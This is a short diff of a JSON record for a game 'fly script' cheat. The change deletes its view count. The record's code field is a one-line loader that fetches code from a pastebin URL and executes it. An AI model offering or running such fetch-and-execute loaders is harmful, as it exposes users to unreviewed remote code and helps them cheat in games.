@@ -1,6 +1,5 @@
 {
   "title": "fly script",
   "description": "fly in any game",
-  "views": 19,
   "code": "loadstring(game:HttpGet('https://pastebin.com/raw/XYZ123'))()"
 }
